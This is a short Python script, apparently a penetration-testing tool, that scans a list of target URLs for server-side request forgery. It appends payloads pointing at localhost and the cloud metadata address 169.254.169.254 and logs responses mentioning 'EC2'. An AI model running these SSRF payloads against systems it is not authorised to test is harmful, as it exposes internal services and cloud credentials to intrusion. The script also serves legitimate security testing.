import requests
from utils.log_utils import log_to_sheet

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://169.254.169.254"
]

def load_targets(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def run_ssrf_scan():
    targets = load_targets("targets/targets.txt")
    for base_url in targets:
        for payload in SSRF_PAYLOADS:
            test_url = f"{base_url}?url={payload}"
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200 and "EC2" in r.text:
                    log = f"[+] SSRF detektovan: {test_url}"
                    print(log)
                    log_to_sheet(__file__, log)
            except:
                continue

if __name__ == "__main__":
    run_ssrf_scan()
